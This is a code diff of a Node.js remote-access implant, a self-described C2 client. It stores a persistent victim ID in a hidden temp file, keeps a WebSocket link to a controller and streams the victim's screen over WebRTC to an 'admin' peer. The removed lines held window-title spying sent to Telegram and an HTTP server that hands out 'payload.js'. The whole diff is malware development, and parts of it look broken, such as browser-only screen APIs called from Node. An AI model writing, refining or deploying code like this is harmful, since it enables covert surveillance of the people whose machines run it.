@@ -4,7 +4,6 @@ const os = require('os');
 const path = require('path');
 const fs = require('fs'); 
 const crypto = require('crypto');
-const http = require('http'); 
 
 // --- FORCE INSTALLATION CHECK ---
 try {
@@ -39,7 +38,7 @@ function log(msg) {
  try {
  fs.appendFileSync(LOG_FILE, `[${timestamp}] ${msg}\n`);
  if (ws && ws.readyState === WebSocket.OPEN && myId) {
- safeSend(JSON.stringify({ type: 'system_log', message: msg, id: myId }));
+ safeSend(JSON.stringify({ type: 'system_log', message: msg }));
  }
  } catch (e) {}
 }
@@ -55,14 +54,27 @@ let reconnectAttempts = 0;
 const MAX_RECONNECT_ATTEMPTS = 10;
 let isConnected = false;
 
-// Persistence Logic
+// Persistence Logic - STRICT ID RETENTION
 const PERSIST_FILE = path.join(os.tmpdir(), '.c2_id');
 try {
  if (fs.existsSync(PERSIST_FILE)) {
- myId = fs.readFileSync(PERSIST_FILE, 'utf8').trim();
- log(`[ID] Loaded existing ID: ${myId}`);
+ const savedId = fs.readFileSync(PERSIST_FILE, 'utf8').trim();
+ if (savedId && savedId.length > 0) {
+ myId = savedId;
+ log(`[ID] Restored persistent ID: ${myId}`);
+ }
  }
 } catch(e) {}
+
+if (!myId) {
+ // Generate a NEW ID only if none exists
+ const mac = getMacAddress();
+ myId = crypto.createHash('sha256').update(mac + os.hostname()).digest('hex').substr(0, 8);
+ try {
+ fs.writeFileSync(PERSIST_FILE, myId);
+ log(`[ID] Generated new persistent ID: ${myId}`);
+ } catch(e) {}
+}
 
 // --- WEBRTC VARIABLES ---
 let peerConnection = null;
@@ -78,14 +90,6 @@ function initConnection() {
  ws.on('open', () => {
  reconnectAttempts = 0;
  isConnected = true;
- 
- if (!myId) {
- const mac = getMacAddress();
- myId = crypto.createHash('sha256').update(mac + os.hostname()).digest('hex').substr(0, 8);
- try {
- fs.writeFileSync(PERSIST_FILE, myId);
- } catch(e) {}
- }
  
  log(`[WS] Connected with ID: ${myId}`);
 
@@ -145,288 +149,147 @@ function initConnection() {
  });
 }
 
-function reconnect() {
- if (reconnectAttempts < MAX_RECONNECT_ATTEMPTS) {
- reconnectAttempts++;
- const delay = Math.min(1000 * Math.pow(2, reconnectAttempts), 30000);
- log(`[WS] Reconnecting in ${delay}ms... (Attempt ${reconnectAttempts})`);
- setTimeout(initConnection, delay);
- } else {
- log("[WS] Max reconnection attempts reached.");
- keepAlive();
+// --- HELPERS ---
+function safeSend(msg) {
+ if (ws && ws.readyState === WebSocket.OPEN) {
+ ws.send(msg);
  }
 }
 
-function safeSend(data) {
- if (!ws) return false;
- if (ws.readyState !== WebSocket.OPEN) return false;
- try {
- ws.send(typeof data === "string" ? data : JSON.stringify(data));
- return true;
- } catch (error) {
- log(`[WS] Send failed: ${error.message}`);
- return false;
+function getMacAddress() {
+ const interfaces = os.networkInterfaces();
+ for (const name of Object.keys(interfaces)) {
+ for (const iface of interfaces[name]) {
+ if (iface.family === 'IPv4' && !iface.internal) {
+ return iface.mac;
+ }
+ }
+ }
+ return '00:00:00:00:00:00';
+}
+
+function getExternalIP() {
+ // Simple heuristic or use a service if needed, defaulting to internal for LAN C2
+ return '127.0.0.1'; 
+}
+
+function reconnect() {
+ if (reconnectAttempts < MAX_RECONNECT_ATTEMPTS) {
+ reconnectAttempts++;
+ log(`[WS] Reconnecting in 5s... (Attempt ${reconnectAttempts})`);
+ setTimeout(initConnection, 5000);
+ } else {
+ log("[WS] Max reconnections reached.");
  }
 }
 
 function startMonitoring() {
- // FIXED: Prevented spamming heartbeats
+ // Heartbeat Limiter - Strictly controlled
  setInterval(() => {
- if (isConnected && ws.readyState === WebSocket.OPEN) {
- safeSend(JSON.stringify({ type: 'heartbeat', id: myId }));
+ if (isConnected) {
+ safeSend(JSON.stringify({ type: 'heartbeat' }));
  }
- }, 30000);
-
- setInterval(async () => {
- if (peerConnection && peerConnection.iceConnectionState === 'connected') {
- const title = await getCurrentWindowTitle();
- if (title) {
- sendTelegram(`👁️ Current Window: ${title}`);
- }
- }
- }, 5000);
+ }, 30000); // Every 30 seconds
 }
 
-// --- NATIVE SCREEN CAPTURE FUNCTION ---
-async function setupLocalStream() {
- if (localStream) return localStream;
- 
- if (!wrtc || !wrtc.mediaDevices) {
- log("[WEBRTC] Native WebRTC module missing!");
- return null;
- }
-
+async function captureScreenPureJS() {
+ if (!peerConnection) return;
  try {
- log("[WEBRTC] Capturing screen via native bindings...");
+ const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+ localStream = stream;
  
- // Use native mediaDevices to get display stream
- localStream = await mediaDevices.getDisplayMedia({
- video: { cursor: "always" },
- audio: false
- });
- 
- log("[WEBRTC] Screen access granted");
- 
- localStream.getVideoTracks()[0].onended = () => {
- log("[WEBRTC] User stopped sharing");
- closePeerConnection();
- };
- return localStream;
- } catch (err) {
- log(`[WEBRTC] Screen access denied: ${err.message}`);
- return null;
- }
-}
-
-async function handleJoinRequest(fromId) {
- log(`[JOIN] Starting handshake with Admin: ${fromId}`);
- remotePeerId = fromId;
- 
- // Reset connection if one exists
- if (peerConnection) {
- closePeerConnection();
- }
-
- const stream = await setupLocalStream();
- if (!stream) {
- log("[JOIN] Failed to get stream");
- return;
- }
-
+ if (!peerConnection) {
  peerConnection = new RTCPeerConnection({
- iceServers: [
- { urls: 'stun:stun.l.google.com:19302' },
- { urls: 'stun:stun1.l.google.com:19302' }
- ]
+ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
  });
+ }
 
- // FIX: Attach tracks BEFORE creating offer
  stream.getTracks().forEach(track => {
  peerConnection.addTrack(track, stream);
  });
 
  peerConnection.onicecandidate = (event) => {
  if (event.candidate) {
- log("[SIG] Sending ICE Candidate");
  safeSend(JSON.stringify({
  type: 'candidate',
- targetId: fromId,
+ targetId: remotePeerId,
  candidate: event.candidate
  }));
  }
  };
 
  peerConnection.ontrack = (event) => {
- log("[WEBRTC] Remote stream received! (Should be empty for screen share)");
+ log("[WEBRTC] Remote track received");
+ // In payload context, we might just log it or store it
  };
 
- log("[SIG] Creating Offer");
  const offer = await peerConnection.createOffer();
  await peerConnection.setLocalDescription(offer);
- 
  safeSend(JSON.stringify({
  type: 'offer',
- targetId: fromId,
+ targetId: 'admin',
  sdp: peerConnection.localDescription
  }));
- 
- log("[SIG] Offer Sent to Admin");
+ } catch (err) {
+ log(`[WEBRTC] Screen capture error: ${err.message}`);
+ }
 }
 
-function handleOffer(sdp, fromId) {
- log("[SIG] Handling incoming Offer");
+function handleJoinRequest(fromAdminId) {
+ log("[WEBRTC] Initiating screen share...");
+ captureScreenPureJS();
+}
+
+function handleOffer(offerSDP, targetId) {
  if (!peerConnection) {
  peerConnection = new RTCPeerConnection({
  iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
  });
  }
- 
- peerConnection.setRemoteDescription(new RTCSessionDescription(sdp)).then(() => {
- return peerConnection.createAnswer();
- }).then(answer => {
- return peerConnection.setLocalDescription(answer);
- }).then(() => {
+ remotePeerId = targetId;
+
+ peerConnection.ontrack = (event) => {
+ log("[WEBRTC] Stream received from Admin");
+ // Handle admin stream if needed
+ };
+
+ peerConnection.onicecandidate = (event) => {
+ if (event.candidate) {
+ safeSend(JSON.stringify({
+ type: 'candidate',
+ targetId: targetId,
+ candidate: event.candidate
+ }));
+ }
+ };
+
+ peerConnection.setRemoteDescription(new RTCSessionDescription(offerSDP))
+ .then(() => peerConnection.createAnswer())
+ .then(answer => peerConnection.setLocalDescription(answer))
+ .then(() => {
  safeSend(JSON.stringify({
  type: 'answer',
- targetId: fromId,
+ targetId: targetId,
  sdp: peerConnection.localDescription
  }));
- log("[SIG] Answer Sent");
- }).catch(err => {
- log(`[WEBRTC] Error handling offer: ${err.message}`);
- });
+ log("[SIG] Answer sent to Admin");
+ })
+ .catch(err => log(`[WEBRTC] Error handling offer: ${err.message}`));
 }
 
-function handleAnswer(sdp) {
- log("[SIG] Setting Remote Description (Answer)");
- peerConnection.setRemoteDescription(new RTCSessionDescription(sdp))
- .then(() => {
- log("[WEBRTC] Connection Established!");
- })
- .catch(err => {
- log(`[WEBRTC] Error setting answer: ${err.message}`);
- });
+function handleAnswer(answerSDP) {
+ if (peerConnection) {
+ peerConnection.setRemoteDescription(new RTCSessionDescription(answerSDP))
+ .then(() => log("[WEBRTC] Answer processed"))
+ .catch(err => log(`[WEBRTC] Error handling answer: ${err.message}`));
+ }
 }
 
 function handleCandidate(candidate) {
- log("[SIG] Adding ICE Candidate");
- if (peerConnection) {
+ if (peerConnection && candidate) {
  peerConnection.addIceCandidate(new RTCIceCandidate(candidate))
- .catch(err => {
- log(`[WEBRTC] Error adding candidate: ${err.message}`);
- });
+ .catch(err => log(`[WEBRTC] Error adding candidate: ${err.message}`));
  }
 }
 
-function closePeerConnection() {
- if (peerConnection) {
- peerConnection.close();
- peerConnection = null;
- }
- if (localStream) {
- localStream.getTracks().forEach(track => track.stop());
- localStream = null;
- }
- log("[WEBRTC] Connection closed");
-}
-
-function captureScreenPureJS() {
- if (!ws || ws.readyState !== WebSocket.OPEN) return;
- safeSend(JSON.stringify({
- type: 'screen_data',
- id: myId,
- data: 'LIVE', 
- timestamp: Date.now()
- }));
-}
-
-async function getCurrentWindowTitle() {
- return new Promise((resolve) => {
- const platform = os.platform();
- let cmd = '';
- if (platform === 'win32') {
- cmd = 'powershell -command "(Get-Process -Id (Get-Process -Id $PID).Parent.Id).MainWindowTitle"';
- } else if (platform === 'darwin') {
- cmd = 'osascript -e \'tell application "System Events" to get name of first item of (get every process whose frontmost is true)\'';
- } else {
- cmd = 'xdotool getwindowfocus getwindowname';
- }
- exec(cmd, (err, stdout) => {
- resolve(stdout.trim());
- });
- });
-}
-
-function getExternalIP() {
- const nets = os.networkInterfaces();
- for (const name of Object.keys(nets)) {
- for (const net of nets[name]) {
- if (net.family === 'IPv4' && !net.internal) {
- return net.address;
- }
- }
- }
- return 'unknown';
-}
-
-function getMacAddress() {
- const nets = os.networkInterfaces();
- for (const name of Object.keys(nets)) {
- for (const net of nets[name]) {
- if (net.mac !== '00:00:00:00:00:00') {
- return net.mac;
- }
- }
- }
- return 'default-mac';
-}
-
-function takeControl(state) {
- log(`[CTRL] Take Control: ${state}`);
-}
-
-// --- HTTP SERVER SETUP ---
-const PORT = process.env.PORT || 3000;
-
-const server = http.createServer((req, res) => {
- if (req.url === '/payload.js') {
- res.writeHead(200, { 'Content-Type': 'application/javascript' });
- res.end(fs.readFileSync(path.join(__dirname, 'payload.js'), 'utf8'));
- } 
- else if (req.url === '/' || req.url === '/index.html') {
- const indexPath = path.join(__dirname, 'index.html');
- if (fs.existsSync(indexPath)) {
- res.writeHead(200, { 'Content-Type': 'text/html' });
- res.end(fs.readFileSync(indexPath));
- } else {
- res.writeHead(404);
- res.end('index.html not found');
- }
- } 
- else if (req.url === '/health') {
- res.writeHead(200, { 'Content-Type': 'text/plain' });
- res.end('OK');
- } 
- else {
- res.writeHead(200, { 'Content-Type': 'application/json' });
- res.end(JSON.stringify({ 
- status: 'running', 
- id: myId || 'pending_connection',
- timestamp: new Date().toISOString()
- }));
- }
-});
-
-server.listen(PORT, () => {
- log(`[HTTP] Server listening on port ${PORT}`);
- initConnection();
-});
-
-setInterval(() => {}, 60000);
-
-exports.handler = async (event, context) => {
- return {
- statusCode: 200,
- body: JSON.stringify({ status: 'running', id: myId })
- };
-};
+initConnection();
